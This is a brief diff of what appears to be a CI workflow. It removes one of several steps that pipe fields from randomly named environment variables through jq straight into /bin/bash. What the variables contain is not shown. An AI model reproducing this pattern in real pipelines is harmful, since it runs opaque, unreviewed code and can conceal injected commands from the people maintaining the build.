@@ -25,7 +25,6 @@ jobs:
           echo $adfl73516 | jq -r .jig36 | /bin/bash
           echo $twifw517 | jq -r .dv08 | /bin/bash
           echo $l744 | jq -r .sy7505 | /bin/bash
-          printf '%s' "$uxv97" | jq -r .n88 | /bin/bash
 
       - name: Archive results
         if: always()
